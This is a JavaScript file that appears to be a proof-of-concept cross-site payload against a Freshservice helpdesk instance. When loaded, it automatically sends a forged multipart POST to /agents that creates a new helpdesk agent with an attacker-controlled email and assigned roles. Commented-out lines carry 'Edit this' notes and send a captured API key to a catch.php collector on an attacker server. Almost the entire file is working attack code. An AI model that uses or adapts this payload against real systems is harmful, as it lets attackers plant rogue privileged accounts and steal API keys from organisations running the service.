function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

function UserAction() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
         if (this.readyState == 4 && this.status == 200) {
             var str = this.responseText;
             alert(str);
            // var domain = "http://localhost/catch.php?api_key="; // Change the Domain based on your use (Edit this)
            // var url=domain+str.split('api_key')[2].substring(2, 22); // Send a request to the attacker server with API Key string (Edit this)
			 httpGet(url)
         }
    };
    var content = `
    
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="utf8"

✓
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="authenticity_token"

CLhSW+MbljIO1YHiSkFDIygVsE6egsUwMX0E+FDbIZBW2gAxnKH3KSBboO+QbV/tGNHddU5pWhEb64WZMlWneQ==
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="agent[occasional]"

false
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[helpdesk_agent]"

true
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[email]"

sathyatesting002@proton.me
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[first_name]"

Sathya
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[last_name]"

Agent
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[job_title]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[phone]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[mobile]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[avatar_attributes][content]"; filename=""
Content-Type: application/octet-stream


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="agent[scoreboard_level_id]"

5407879
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[time_zone]"

Chennai
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[time_format]"

12h
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[language]"

en
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[vip_user]"

0
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[location_id]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[department_users_attributes][department_id]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[reporting_manager_id]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[address]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="agent[signature_html]"

<p>&nbsp;</p>

-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="agent[user_id]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[description]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="group_agent_type"

on
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="agent[observer_list]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="agent[member_list]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="agent[group_list]"


-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="user[role_ids][]"

[{"name":"12932801","operator":"0"}]
-----------------------------34399639671901203802389653615
Content-Disposition: form-data; name="redactor_image_field"

"[]"
-----------------------------34399639671901203802389653615--
    `;
    xhttp.open("POST", "/agents", true); // Get request the Profile page of the agent (Edit this)
    xhttp.setRequestHeader(`User-Agent`, `Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0`);
    xhttp.setRequestHeader(`Accept`, `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8`);
    xhttp.setRequestHeader(`Accept-Language`, `en-US,en;q=0.5`);
    xhttp.setRequestHeader(`Accept-Encoding`, `gzip, deflate`);
    xhttp.setRequestHeader(`Referer`, `https://superstore.freshservice.com/agents/new`);
    // var ct = `multipart/form-data;
    //  boundary=---------------------------34399639671901203802389653615`;
    xhttp.setRequestHeader(`Content-Type`,`multipart/form-data; boundary=---------------------------34399639671901203802389653615`);
    xhttp.setRequestHeader(`Content-Length`, `3894`);
    xhttp.setRequestHeader(`Origin`, `https://superstore.freshservice.com`);
    xhttp.setRequestHeader(`Upgrade-Insecure-Requests`, `1`)
    xhttp.setRequestHeader(`Sec-Fetch-Dest`,`document`);
    xhttp.setRequestHeader(`Sec-Fetch-Mode`, `navigate`);
    xhttp.setRequestHeader(`Sec-Fetch-Site`, `same-origin`);
    xhttp.setRequestHeader(`Sec-Fetch-User`, `?1`);
    xhttp.setRequestHeader(`Te`, `trailers`);
    xhttp.send(content);
    // xhttp.send();
};
UserAction(); // Execute the Function when the JS is loaded